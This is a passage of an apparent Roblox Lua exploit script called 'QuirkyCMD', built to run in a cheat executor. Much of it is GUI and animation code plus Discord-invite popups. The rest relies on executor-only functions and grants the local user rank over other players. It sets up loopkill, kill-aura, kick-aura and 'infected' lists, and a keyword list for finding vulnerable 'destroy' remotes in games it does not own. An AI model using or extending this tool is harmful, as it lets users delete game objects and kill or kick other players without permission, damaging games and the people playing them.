		closeButton.Parent = cmds
		closeButton.Active = false
		closeButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		closeButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
		closeButton.BorderSizePixel = 0
		closeButton.Position = UDim2.new(0.306886673, 0, -7.849561e-08, 0)
		closeButton.Size = UDim2.new(0.386227101, 0, 0.0566039979, 0)
		closeButton.Font = Enum.Font.SourceSansBold
		closeButton.Text = "Close"
		closeButton.TextColor3 = Color3.fromRGB(159, 159, 159)
		closeButton.TextSize = 14.000
		closeButton.TextWrapped = true
	
		UICorner_6.CornerRadius = UDim.new(0.400000006, 0)
		UICorner_6.Parent = closeButton
	
		cmdList.Name = "cmdList"
		cmdList.Parent = cmds
		cmdList.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		cmdList.BorderColor3 = Color3.fromRGB(0, 0, 0)
		cmdList.BorderSizePixel = 0
		cmdList.Position = UDim2.new(0, 0, 0.0566038229, 0)
		cmdList.Size = UDim2.new(0.999999881, 0, 0.943396211, 0)
		cmdList.AutomaticCanvasSize = Enum.AutomaticSize.Y
		cmdList.CanvasSize = UDim2.new()
		cmdList.ScrollBarImageColor3 = Color3.fromRGB(200, 200, 200) -- Optional visual enhancement
	
		UIListLayout.Parent = cmdList
		UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		UIListLayout.Padding = UDim.new(0, 5)
	
		template.Name = "template"
		template.Parent = cmdList
		template.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		template.BackgroundTransparency = 1.000
		template.BorderColor3 = Color3.fromRGB(0, 0, 0)
		template.BorderSizePixel = 0
		template.Position = UDim2.new(0, 0, 0.032717593, 0)
		template.Size = UDim2.new(0.999999821, 0, 0.323825359, 0)
		template.Font = Enum.Font.SourceSans
		template.Text = "error, please contact cynatica. you possibly executed QuirkyCMD twice."
		template.TextColor3 = Color3.fromRGB(200, 200, 200)
		template.TextScaled = true
		template.TextSize = 14.000
		template.TextWrapped = true
	
		UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.58, Color3.fromRGB(229, 229, 229)), ColorSequenceKeypoint.new(0.78, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
		UIGradient.Parent = template
	
		UICorner_7.CornerRadius = UDim.new(0, 10)
		UICorner_7.Parent = cmdList
	
		-- Scripts:
	
		local function JPZSSO_fake_script() -- main.drag 
			local script = Instance.new('LocalScript', main)
	
			local gui = script.Parent
			gui.Active = true
			gui.Selectable = true
	
			local UserInputService = game:GetService("UserInputService")
			local RunService = game:GetService("RunService")
	
			local dragging = false
			local dragStart
			local startPos
			local targetPos
			local dragSpeed = 8
	
			local function lerpVec2(a, b, t)
				return a:Lerp(b, t)
			end
	
			RunService.Heartbeat:Connect(function(dt)
				if not targetPos then return end
				local pos = gui.Position
				local newX = lerpVec2(Vector2.new(pos.X.Offset, 0), Vector2.new(targetPos.X.Offset, 0), dt * dragSpeed).X
				local newY = lerpVec2(Vector2.new(0, pos.Y.Offset), Vector2.new(0, targetPos.Y.Offset), dt * dragSpeed).Y
				gui.Position = UDim2.new(pos.X.Scale, newX, pos.Y.Scale, newY)
			end)
	
			local function startDrag(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					dragging = true
					dragStart = input.Position
					startPos = gui.Position
					local conn
					conn = input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragging = false
							conn:Disconnect()
						end
					end)
				end
			end
	
			gui.InputBegan:Connect(startDrag)
	
			for i, child in gui:GetChildren() do
				if child.Name == "menu" and child:IsA("ImageButton") then
					child.InputBegan:Connect(startDrag)
				end
			end
	
			UserInputService.InputChanged:Connect(function(input)
				if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
					local delta = input.Position - dragStart
					targetPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
				end
			end)
	
	
		end
		coroutine.wrap(JPZSSO_fake_script)()
		local function CAHA_fake_script() -- main.anims 
			local script = Instance.new('LocalScript', main)
	
			local frame = script.Parent
			local TweenService = game:GetService("TweenService")
	
			local originalSize = UDim2.new(0, 60, 0, 40)
			local expandedSize = UDim2.new(0, 250, 0, 40)
	
			frame.Size = originalSize
	
			local menu = frame:FindFirstChild("menu")
			local commandsBtn = nil
			if menu then
				local selection = menu:FindFirstChild("selection")
				if selection then
					commandsBtn = selection:FindFirstChild("commands")
				end
			end
			local cmdBox = frame:FindFirstChild("cmdBox")
			local cmdList = frame:FindFirstChild("cmdList")
			local template = cmdList and cmdList:FindFirstChild("template")
	
			local tweenTime = 0.45 
			local outTweenTime = 0.45
			local easingStyle = Enum.EasingStyle.Quad
			local easingDir = Enum.EasingDirection.Out
	
			local cmdListOriginalPosition = cmdList and cmdList.Position
			local cmdListHiddenPosition = cmdListOriginalPosition and UDim2.new(cmdListOriginalPosition.X.Scale, cmdListOriginalPosition.X.Offset, cmdListOriginalPosition.Y.Scale + 1, cmdListOriginalPosition.Y.Offset)
			local cmdListOriginalTransparency = cmdList and cmdList.BackgroundTransparency or 0
	
			local templateOriginalPosition = template and template.Position
			local templateHiddenPosition = templateOriginalPosition and UDim2.new(templateOriginalPosition.X.Scale, templateOriginalPosition.X.Offset, templateOriginalPosition.Y.Scale + 1, templateOriginalPosition.Y.Offset)
			local templateOriginalTransparency = template and template.TextTransparency or 0
			local templateOriginalBGTransparency = template and template.BackgroundTransparency or 0
	
			local cmdBoxOriginalBG = cmdBox and (cmdBox.BackgroundTransparency or 0) or 0
			local cmdBoxOriginalText = cmdBox and (cmdBox.TextTransparency or 0) or 0
	
			if cmdBox then
				cmdBox.Visible = false
				cmdBox.BackgroundTransparency = 1
				cmdBox.TextTransparency = 1
			end
			if cmdList then
				if cmdListHiddenPosition then
					cmdList.Position = cmdListHiddenPosition
				end
				cmdList.Visible = false
				cmdList.BackgroundTransparency = 1
			end
			if template then
				if templateHiddenPosition then
					template.Position = templateHiddenPosition
				end
				template.Visible = false
				template.TextTransparency = 1
				template.BackgroundTransparency = 1
			end
	
			local cmdBoxBGtween, cmdBoxTextTween, frameTween, btnTween
			local cmdListTween, templateTween, templateBGTween
	
			local function cancelCmdBoxTweens()
				if cmdBoxBGtween then cmdBoxBGtween:Cancel() cmdBoxBGtween = nil end
				if cmdBoxTextTween then cmdBoxTextTween:Cancel() cmdBoxTextTween = nil end
			end
			local function cancelFrameTween()
				if frameTween then frameTween:Cancel() frameTween = nil end
			end
			local function cancelBtnTween()
				if btnTween then btnTween:Cancel() btnTween = nil end
			end
			local function cancelCmdListTween()
				if cmdListTween then cmdListTween:Cancel() cmdListTween = nil end
			end
			local function cancelTemplateTweens()
				if templateTween then templateTween:Cancel() templateTween = nil end
				if templateBGTween then templateBGTween:Cancel() templateBGTween = nil end
			end
	
			local function setChildrenVisibility(visible)
				for _, child in frame:GetChildren() do
					if child ~= menu and child ~= script and child:IsA("GuiObject") and child ~= cmdBox and child ~= cmdList then
						child.Visible = visible
					end
				end
			end
	
			local function tweenCmdBoxIn(onComplete)
				if not cmdBox then if onComplete then onComplete() end return end
				cancelCmdBoxTweens()
				cmdBox.Visible = true
				cmdBox.BackgroundTransparency = 1
				cmdBox.TextTransparency = 1
				local tweenInfo = TweenInfo.new(tweenTime, easingStyle, easingDir)
				cmdBoxBGtween = TweenService:Create(cmdBox, tweenInfo, {BackgroundTransparency = cmdBoxOriginalBG})
				cmdBoxTextTween = TweenService:Create(cmdBox, tweenInfo, {TextTransparency = cmdBoxOriginalText})
				local completed = 0
				local function onTweenComplete()
					completed = completed + 1
					if completed == 2 then
						cmdBoxBGtween = nil
						cmdBoxTextTween = nil
						if onComplete then onComplete() end
					end
				end
				if cmdBoxBGtween and cmdBoxTextTween then
					cmdBoxBGtween.Completed:Connect(onTweenComplete)
					cmdBoxTextTween.Completed:Connect(onTweenComplete)
					cmdBoxBGtween:Play()
					cmdBoxTextTween:Play()
				else
					if onComplete then onComplete() end
				end
			end
	
			local function tweenCmdBoxOut(onComplete)
				if not cmdBox then if onComplete then onComplete() end return end
				cancelCmdBoxTweens()
				local tweenInfo = TweenInfo.new(outTweenTime, easingStyle, easingDir)
				cmdBoxBGtween = TweenService:Create(cmdBox, tweenInfo, {BackgroundTransparency = 1})
				cmdBoxTextTween = TweenService:Create(cmdBox, tweenInfo, {TextTransparency = 1})
				local completed = 0
				local function onTweenComplete()
					completed = completed + 1
					if completed == 2 then
						cmdBox.Visible = false
						cmdBoxBGtween = nil
						cmdBoxTextTween = nil
						if onComplete then onComplete() end
					end
				end
				if cmdBoxBGtween and cmdBoxTextTween then
					cmdBoxBGtween.Completed:Connect(onTweenComplete)
					cmdBoxTextTween.Completed:Connect(onTweenComplete)
					cmdBoxBGtween:Play()
					cmdBoxTextTween:Play()
				else
					if onComplete then onComplete() end
				end
			end
	
			local cmdListShowing = false
			local function showCmdList()
				cancelCmdListTween()
				cancelTemplateTweens()
				if not cmdList then return end
				cmdList.Visible = true
				if cmdListHiddenPosition then
					cmdList.Position = cmdListHiddenPosition
				end
				cmdList.BackgroundTransparency = 1
				if template then
					if templateHiddenPosition then
						template.Position = templateHiddenPosition
					end
					template.Visible = true
					template.TextTransparency = 1
					template.BackgroundTransparency = 1
				end
				if cmdListOriginalPosition then
					cmdListTween = TweenService:Create(cmdList, TweenInfo.new(tweenTime, easingStyle, easingDir), {
						Position = cmdListOriginalPosition,
						BackgroundTransparency = cmdListOriginalTransparency
					})
					cmdListTween.Completed:Connect(function() cmdListTween = nil end)
					cmdListTween:Play()
				end
				if template and templateOriginalPosition then
					templateTween = TweenService:Create(template, TweenInfo.new(tweenTime, easingStyle, easingDir), {
						Position = templateOriginalPosition,
						TextTransparency = templateOriginalTransparency
					})
					templateBGTween = TweenService:Create(template, TweenInfo.new(tweenTime, easingStyle, easingDir), {
						BackgroundTransparency = templateOriginalBGTransparency
					})
					templateTween.Completed:Connect(function() templateTween = nil end)
					templateBGTween.Completed:Connect(function() templateBGTween = nil end)
					templateTween:Play()
					templateBGTween:Play()
				end
				cmdListShowing = true
			end
	
			local function hideCmdList()
				cancelCmdListTween()
				cancelTemplateTweens()
				if not cmdList then return end
				local tweenInfo = TweenInfo.new(outTweenTime, easingStyle, easingDir)
				if cmdListHiddenPosition then
					cmdListTween = TweenService:Create(cmdList, tweenInfo, {
						Position = cmdListHiddenPosition,
						BackgroundTransparency = 1
					})
					cmdListTween.Completed:Connect(function()
						cmdList.Visible = false
						cmdListTween = nil
					end)
					cmdListTween:Play()
				else
					cmdList.Visible = false
				end
				if template and templateHiddenPosition then
					templateTween = TweenService:Create(template, tweenInfo, {
						Position = templateHiddenPosition,
						TextTransparency = 1
					})
					templateBGTween = TweenService:Create(template, tweenInfo, {
						BackgroundTransparency = 1
					})
					templateTween.Completed:Connect(function()
						template.Visible = false
						templateTween = nil
					end)
					templateBGTween.Completed:Connect(function()
						templateBGTween = nil
					end)
					templateTween:Play()
					templateBGTween:Play()
				elseif template then
					template.Visible = false
				end
				cmdListShowing = false
			end
	
			local btnWidth, btnHeight = 27, 30
			local originalBtnPosition = UDim2.new(0.5, -btnWidth/2, 0.5, -btnHeight/2)
			local originalBtnSize = UDim2.new(0, btnWidth, 0, btnHeight)
			local hoveredBtnPosition = UDim2.new(0.812, 0, 0.125, 0)
			local hoveredBtnSize = UDim2.new(0, btnWidth, 0, btnHeight)
	
			if menu then
				menu.Visible = true
				menu.Position = originalBtnPosition
				menu.Size = originalBtnSize
			end
			setChildrenVisibility(false)
	
			local function tweenFrameSize(targetSize, onComplete)
				cancelFrameTween()
				frameTween = TweenService:Create(frame, TweenInfo.new(tweenTime, easingStyle, easingDir), {Size = targetSize})
				frameTween.Completed:Connect(function()
					frameTween = nil
					if onComplete then onComplete() end
				end)
				frameTween:Play()
			end
	
			local function tweenMenuButton(targetPos, targetSize)
				cancelBtnTween()
				if menu then
					btnTween = TweenService:Create(menu, TweenInfo.new(tweenTime, easingStyle, easingDir), {
						Position = targetPos,
						Size = targetSize
					})
					btnTween.Completed:Connect(function()
						btnTween = nil
					end)
					btnTween:Play()
				end
			end
	
			local function resetFrameToCollapsed()
				cancelFrameTween()
				cancelBtnTween()
				cancelCmdBoxTweens()
				frame.Size = originalSize
				if menu then
					menu.Position = originalBtnPosition
					menu.Size = originalBtnSize
				end
				setChildrenVisibility(false)
				if cmdBox then
					cmdBox.Visible = false
					cmdBox.BackgroundTransparency = 1
					cmdBox.TextTransparency = 1
				end
				hideCmdList()
			end
	
			local function playIntroAnimation()
				cancelFrameTween()
				cancelBtnTween()
				tweenFrameSize(expandedSize, function()
					setChildrenVisibility(true)
					tweenCmdBoxIn()
				end)
				if menu then
					tweenMenuButton(hoveredBtnPosition, hoveredBtnSize)
				end
			end
	
			local isExpanded = false
			local function toggleExpand()
				if isExpanded then
					tweenCmdBoxOut(function()
						setChildrenVisibility(false)
						tweenFrameSize(originalSize)
						if menu then
							tweenMenuButton(originalBtnPosition, originalBtnSize)
						end
						hideCmdList()
					end)
				else
					playIntroAnimation()
				end
				isExpanded = not isExpanded
			end
	
			if menu then
				menu.MouseButton1Click:Connect(toggleExpand)
			end
	
			if commandsBtn then
				commandsBtn.MouseButton1Click:Connect(function()
					if cmdListShowing then
						hideCmdList()
					else
						showCmdList()
					end
				end)
			end
	
			resetFrameToCollapsed()
	
	
		end
		coroutine.wrap(CAHA_fake_script)()
	
	
		if not game:IsLoaded() then game.Loaded:Wait() end
	
		--Discord Invite
		local notificationShown = false
		local TweenService = game:GetService("TweenService")
		local discordInvite = "https://discord.gg/quirkycmd"
	
		local function createNotification()
			local gui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	
			local screen = Instance.new("ScreenGui")
			screen.Name = "ok"
			screen.IgnoreGuiInset = true
			screen.ResetOnSpawn = false
			screen.Parent = gui
	
			local frame = Instance.new("Frame")
			frame.Size = UDim2.new(0, 280, 0, 90)
			frame.AnchorPoint = Vector2.new(1, 1)
			frame.Position = UDim2.new(1, -20, 1, 120)
			frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			frame.BackgroundTransparency = 0
			frame.BorderSizePixel = 0
			frame.ClipsDescendants = true
			frame.Parent = screen
	
			Instance.new("UIScale", frame)
			Instance.new("UIAspectRatioConstraint", frame).AspectRatio = 3
	
			local corner = Instance.new("UICorner", frame)
			corner.CornerRadius = UDim.new(0, 16)
	
			local close = Instance.new("TextButton")
			close.Text = "X"
			close.Size = UDim2.new(0, 22, 0, 22)
			close.Position = UDim2.new(1, -26, 0, 6)
			close.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			close.TextColor3 = Color3.fromRGB(159, 159, 159)
			close.Font = Enum.Font.FredokaOne
			close.TextSize = 14
			close.BorderSizePixel = 0
			close.Parent = frame
	
			local ccorner = Instance.new("UICorner", close)
			ccorner.CornerRadius = UDim.new(1, 0)
	
			local container = Instance.new("Frame")
			container.BackgroundTransparency = 1
			container.Size = UDim2.new(1, -24, 1, -24)
			container.Position = UDim2.new(0, 12, 0, 12)
			container.Parent = frame
	
			local layout = Instance.new("UIListLayout")
			layout.SortOrder = Enum.SortOrder.LayoutOrder
			layout.Padding = UDim.new(0, 6)
			layout.VerticalAlignment = Enum.VerticalAlignment.Center
			layout.Parent = container
	
	
			local label = Instance.new("TextLabel")
			label.Text = "Join our Discord Server!"
			label.TextColor3 = Color3.fromRGB(159, 159, 159)
			label.Font = Enum.Font.GothamBold
			label.TextSize = 14
			label.TextXAlignment = Enum.TextXAlignment.Center
			label.BackgroundTransparency = 1
			label.Size = UDim2.new(1, 0, 0, 18)
			label.LayoutOrder = 1
			label.Parent = container
	
			local link = Instance.new("TextLabel")
			link.Text = discordInvite
			link.TextColor3 = Color3.fromRGB(159, 159, 159)
			link.Font = Enum.Font.Gotham
			link.TextSize = 13
			link.TextXAlignment = Enum.TextXAlignment.Center
			link.BackgroundTransparency = 1
			link.Size = UDim2.new(1, 0, 0, 18)
			link.LayoutOrder = 2
			link.Parent = container
	
			local buttonContainer = Instance.new("Frame")
			buttonContainer.BackgroundTransparency = 1
			buttonContainer.Size = UDim2.new(1, 0, 0, 26)
			buttonContainer.LayoutOrder = 3
			buttonContainer.Parent = container
	
			local button = Instance.new("TextButton")
			button.Text = "Copy Invite"
			button.Size = UDim2.new(0, 110, 1, 0)
			button.AnchorPoint = Vector2.new(0.5, 0)
			button.Position = UDim2.new(0.5, 0, 0, 0)
			button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			button.TextColor3 = Color3.fromRGB(159, 159, 159)
			button.Font = Enum.Font.GothamSemibold
			button.TextSize = 13
			button.Parent = buttonContainer
	
			local bcorner = Instance.new("UICorner", button)
			bcorner.CornerRadius = UDim.new(0, 8)
	
			local tweenIn = TweenService:Create(frame, TweenInfo.new(0.7, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
				Position = UDim2.new(1, -20, 1, -20)
			})
			tweenIn:Play()
	
			button.MouseButton1Click:Connect(function()
				pcall(function()
					setclipboard(discordInvite)
				end)
				button.Text = "Copied!"
				task.delay(1, function()
					button.Text = "Copy Invite"
				end)
			end)
	
			local function hide()
				local tweenOut = TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
					Position = UDim2.new(1, -20, 1, 120)
				})
				tweenOut:Play()
				tweenOut.Completed:Connect(function()
					screen:Destroy()
				end)
			end
	
			close.MouseButton1Click:Connect(hide)
			task.delay(10, hide)
		end
	
		createNotification()
	
		--[[Variables]]--
		local debugOutput = true
		local checkTime = 0.33
		local flySpeed = 50
		local UGCVS = game:GetService("UGCValidationService")
		local uis = game:GetService("UserInputService")
		local sgui = game:GetService("StarterGui")
		local rs = game:GetService("RunService")
		local rStorage = game:GetService("ReplicatedStorage")
		local players = game:GetService("Players")
		local localPlayer = players.LocalPlayer
	
		local gui = quirkycmd or localPlayer:FindFirstChildOfClass("PlayerGui"):WaitForChild("quirkyCMD")
		local gethui = gethui or function() return localPlayer:FindFirstChildOfClass("PlayerGui") end
		local main = gui:WaitForChild("main")
		local box = main:WaitForChild("cmdBox")
		local mobileButton = gui:WaitForChild("mobileOpen")
		local cmdsFrame = gui:WaitForChild("cmds")
		local cmdsList = cmdsFrame:WaitForChild("cmdList")
		local cmdTemplate = cmdsList:WaitForChild("template")
		local closeButton = cmdsFrame:WaitForChild("closeButton")
		local remotePath = gui:WaitForChild("remotepath")
	
		local genv = (getgenv and (getgenv() ~= getfenv()) and getgenv()) or _G
	
		local gethiddenproperty
		if pcall(function() gethiddenproperty(localPlayer,"SimulationRadius") end) then
			gethiddenproperty = gethiddenproperty 
		else
			gethiddenproperty = function(i, v) return UGCVS:GetPropertyValue(i, v) end
		end
		local sethiddenproperty = sethiddenproperty or function(inst,i,v) pcall(function() inst[i] = v end) end
		local isnetworkowner = isnetworkowner or function(part) return part.ReceiveAge == 0 end
		local isMobile = uis.TouchEnabled
		local isTesting = game.PlaceId == 16245218863
		local modernChat = game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.TextChatService
		local chatEvents = (not modernChat) and rStorage:FindFirstChild("DefaultChatSystemChatEvents")
		local mobileOffset = isMobile and 0.1 or 0
		local prefix = ";"
		local prefixEnum = Enum.KeyCode.Semicolon
		-- credits to itzyaboyluq on github for the word list
		local wordList = {"delete", "remove", "destroy", "clean", "clear","bullet", "bala", "shoot", "shot", "fire", "segway", "handless", "sword", "attack", "despawn", "deletar", "apagar"}
		local camera = workspace.CurrentCamera
		local mouse = localPlayer:GetMouse()
		local character
	
		task.delay(2,function()
			if character then return end
			cmdTemplate.Text = "waiting for LocalPlayer.Character..."
		end)
		character = localPlayer.Character or localPlayer.CharacterAdded:Wait() 
		local testInstance = localPlayer:WaitForChild("StarterGear",1)
		if not testInstance then cmdTemplate.Text = "StarterGear already missing." return error("no test instance found") end
	
		local visible = false
		genv.connections = {}
		local commands = {}
		local remotes = {}
		local services = {}
		local privilegeLevels = {}
		local rankNames = {"admin", "owner", "self"}
		local bans = {}
		local loopkills = {}
		local infected = {}
		local killauras = {}
		local kickauras = {}
		local wslocks = {}
		local useSegway = false
		local slockEnabled = false
		local clickDelete = false
		local clickDeleteBox
		local inDatabase = false
		local scaleValues = {
			"BodyProportionScale",
			"BodyWidthScale",
			"BodyHeightScale",
			"BodyDepthScale",
			"HeadScale",
			"BodyTypeScale"
		}
		local limbs = {
			"arm",
			"leg",
			"foot"
		}
	
		local function httpget(url)
			if isTesting then
				return rStorage:WaitForChild("request"):InvokeServer(url)
			end
			return game:HttpGet(url)
		end
	
		--[[Add test game compatability]]--
		if isTesting then
			function loadstring(src)
				return require(rStorage:WaitForChild("Loadstring"))(src)
			end
	
			local files = localPlayer.PlayerGui:WaitForChild("workspace")
	
			function isfile(str)
				local str = str or ""
				return files:FindFirstChild(str) and true or false
			end
	
			function writefile(str,txt)
				local str = str or ""
				local val = isfile(str) and files[str] or Instance.new("StringValue", files)
				val.Name = str
				val.Value = txt
			end
	
			function readfile(str)
				local str = str or ""
				if not files:FindFirstChild(str) then return error("file " .. str .. " does not exist") end
				return files[str].Value
			end
	
			function listfiles(str)
				local res = {}
				for i,v in pairs(files:GetChildren()) do
					table.insert(res, v.Name)
				end
				return res
			end
	
			function loadfile(str)
				local str = str or ""
				if not files:FindFirstChild(str) then return error("file " .. str .. " does not exist") end
				return loadstring(files[str].Value)
			end
		end
	
		--[[Prepare UI]]--
		cmdsFrame.Visible = false
		main.Visible = false	
		cmdTemplate.Visible = false
		mobileButton.Visible = false
		box.Position = UDim2.new(0, 0, 0, 0)
		box.Size = UDim2.new(0.824, 0, 1, 0)
	
		--[[Set up admin system logic]]--
		for i,v in pairs(players:GetPlayers()) do
			privilegeLevels[v.Name] = 0
		end
	
		privilegeLevels[localPlayer.Name] = 3
	
		table.insert(genv.connections, players.PlayerAdded:Connect(function(plr)
			privilegeLevels[plr.Name] = 0
		end))
	
		table.insert(genv.connections, players.PlayerRemoving:Connect(function(plr)
			privilegeLevels[plr.Name] = nil
		end))
	
		--[[Misc. functions]]--
		function debugPrint(...)
			if not debugOutput then return end
			warn(...)
		end
	
		debugPrint("loaded UI")
	
		function notify(title,text,duration)
			sgui:SetCore("SendNotification", {
				Title = title or "", 
				Text = text or "",
				Duration = duration or 5
			})
		end
	
		local function getKeyCode(char)
			local char = char:lower()
			local byte = char:byte()
			for i,v in pairs(Enum.KeyCode:GetEnumItems()) do
				local value = v.Value
				if value ~= byte then continue end
				return v
			end
		end
	
		function findPlayers(input)
			if input == nil or input == "" then return
				{localPlayer}
			end 
	
			local input = input:lower()
			local players = players:GetPlayers()
			local targets = {}
	
			if input == "me" then
				return {localPlayer}
			end
			if input == "all" then
				return players
			end
			if input == "others" then
				targets = players
				table.remove(targets,1)
				return targets
			end
	
			if input == "random" then
				return {players[math.random(1,#players)]}
			end
	
			for i,v in pairs(players) do
				local plrName = v.Name:lower()
				local plrDisplayName = v.DisplayName:lower()
				if not (plrName:find(input) or plrDisplayName:find(input)) then continue end
				table.insert(targets, v)
			end
	
			return targets
		end
	
		function abort()
			for i,v in pairs(genv.connections) do
				if typeof(v) == "Instance" then v:Destroy() continue end
				v:Disconnect()
			end
			gui:Destroy()
			if modernChat then
				game:GetService("TextChatService").TextChannels["RBXGeneral"].OnIncomingMessage = nil
			end
			if clickDeleteBox then clickDeleteBox:Destroy() end
			genv.delete = nil
			genv.connections = nil
			genv.foundRemote = nil
		end
	
		local function lerp(a, b, m)
			return a + (b - a) * m
		end
	
		--[[Update variables]]--
		table.insert(genv.connections, localPlayer.CharacterAdded:Connect(function(char)
			character = char
		end))
	
		--Discord Invite
		local TweenService = game:GetService("TweenService")
		local Lighting = game:GetService("Lighting")
	
		local visible = false
		local hasPlayedSound = false
		local hasBlurred = false
		local notificationDismissed = false
	
		local appearSoundId = "rbxassetid://88591874532589" -- you can change this to your desired sound with an id. cool right?
		local discordInvite = "https://discord.gg/quirkycmd"-- same goes for this link, but i'd prefer if you keep it as quirky ;)
	
		local function playAppearSound()
			local sound = Instance.new("Sound")
			sound.SoundId = appearSoundId
			sound.Volume = 0.7
			sound.PlayOnRemove = true
			sound.Parent = workspace
			sound:Destroy()
		end
	
		local function addFirstTimeBlur()
			local blur = Instance.new("BlurEffect")
			blur.Name = "StartBlur"
			blur.Size = 0
			blur.Parent = Lighting
	
			local blurIn = TweenService:Create(blur, TweenInfo.new(0.6, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out), { Size = 10 })
			blurIn:Play()
	
			task.delay(1, function()
				local blurOut = TweenService:Create(blur, TweenInfo.new(0.5, Enum.EasingStyle.Exponential, Enum.EasingDirection.In), { Size = 0 })
				blurOut:Play()
				blurOut.Completed:Connect(function()
					blur:Destroy()
				end)
			end)
		end
	
		local function showFirstTimeNotification()
			if notificationDismissed then return end
	
			local gui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	
			local screen = Instance.new("ScreenGui")
			screen.Name = "ok"
			screen.IgnoreGuiInset = true
			screen.ResetOnSpawn = false
			screen.Parent = gui
	
			local frame = Instance.new("Frame")
			frame.Size = UDim2.new(0, 280, 0, 90)
			frame.AnchorPoint = Vector2.new(1, 1)
			frame.Position = UDim2.new(1, -20, 1, 120)
			frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			frame.BackgroundTransparency = 0
			frame.BorderSizePixel = 0
			frame.ClipsDescendants = true
			frame.Parent = screen
	
			Instance.new("UIScale", frame)
			Instance.new("UIAspectRatioConstraint", frame).AspectRatio = 3
	
			local corner = Instance.new("UICorner", frame)
			corner.CornerRadius = UDim.new(0, 16)
	
			local close = Instance.new("TextButton")
			close.Text = "X"
			close.Size = UDim2.new(0, 22, 0, 22)
			close.Position = UDim2.new(1, -26, 0, 6)
			close.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			close.TextColor3 = Color3.fromRGB(159, 159, 159)
			close.Font = Enum.Font.FredokaOne
			close.TextSize = 14
			close.BorderSizePixel = 0
			close.Parent = frame
	
			local ccorner = Instance.new("UICorner", close)
			ccorner.CornerRadius = UDim.new(1, 0)
	
			local container = Instance.new("Frame")
			container.BackgroundTransparency = 1
			container.Size = UDim2.new(1, -24, 1, -24)
			container.Position = UDim2.new(0, 12, 0, 12)
			container.Parent = frame
	
			local layout = Instance.new("UIListLayout")
			layout.SortOrder = Enum.SortOrder.LayoutOrder
			layout.Padding = UDim.new(0, 6)
			layout.VerticalAlignment = Enum.VerticalAlignment.Center
			layout.Parent = container
	
	
			local label = Instance.new("TextLabel")
			label.Text = "Join our Discord Server!"
			label.TextColor3 = Color3.fromRGB(159, 159, 159)
			label.Font = Enum.Font.GothamBold
			label.TextSize = 14
			label.TextXAlignment = Enum.TextXAlignment.Center
			label.BackgroundTransparency = 1
			label.Size = UDim2.new(1, 0, 0, 18)
			label.LayoutOrder = 1
			label.Parent = container
	
			local link = Instance.new("TextLabel")
			link.Text = discordInvite
			link.TextColor3 = Color3.fromRGB(159, 159, 159)
			link.Font = Enum.Font.Gotham
			link.TextSize = 13
			link.TextXAlignment = Enum.TextXAlignment.Center
			link.BackgroundTransparency = 1
			link.Size = UDim2.new(1, 0, 0, 18)
			link.LayoutOrder = 2
			link.Parent = container
	
			local buttonContainer = Instance.new("Frame")
			buttonContainer.BackgroundTransparency = 1
			buttonContainer.Size = UDim2.new(1, 0, 0, 26)
			buttonContainer.LayoutOrder = 3
			buttonContainer.Parent = container
	
			local button = Instance.new("TextButton")
			button.Text = "Copy Invite"
			button.Size = UDim2.new(0, 110, 1, 0)
			button.AnchorPoint = Vector2.new(0.5, 0)
			button.Position = UDim2.new(0.5, 0, 0, 0)
			button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			button.TextColor3 = Color3.fromRGB(159, 159, 159)
			button.Font = Enum.Font.GothamSemibold
			button.TextSize = 13
			button.Parent = buttonContainer
	
			local bcorner = Instance.new("UICorner", button)
			bcorner.CornerRadius = UDim.new(0, 8)
	
			local tween = TweenService:Create(frame, TweenInfo.new(0.6, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
				Position = UDim2.new(1, -20, 1, -20)
			})
			tween:Play()
	
			button.MouseButton1Click:Connect(function()
				pcall(function()
					setclipboard(discordInvite)
				end)
				button.Text = "Copied!"
				task.delay(1, function()
					button.Text = "Copy Invite"
				end)
			end)
	
			local function hideNotification()
				if notificationDismissed then return end
				notificationDismissed = true
				local out = TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
					Position = UDim2.new(1, -20, 1, 120)
				})
				out:Play()
				out.Completed:Connect(function()
					screen:Destroy()
				end)
			end
	
			close.MouseButton1Click:Connect(hideNotification)
			task.delay(10, hideNotification)
		end
	
		local function toggleBar(focus)
			visible = not visible
			if visible then
				box.Visible = true
				if focus then
					box:CaptureFocus()
				end
			else
				box.Visible = false
				box:ReleaseFocus()
			end
		end
	
		local function toggleMain()
			main.Visible = visible
		end
	
		table.insert(genv.connections, uis.InputBegan:Connect(function(input, processed) 
			if processed and uis:GetFocusedTextBox() ~= box then return end
			if input.KeyCode ~= prefixEnum then return end 
			toggleBar(true)  
			toggleMain() 
			if visible then return end
			box:ReleaseFocus()  
		end))
	
		--[[Find destroy remote & save to working games list]]--
		local remoteJSON
	
		local function hasFiles()
			return (isfile and readfile and writefile)
		end
	
		local function checkList(str)
			local s,l = pcall(listfiles,str)
			return s and #l > 0 and l
		end
	
		local function listFiles() -- really wish i didnt have to do this
			if isTesting then return listfiles() end
	
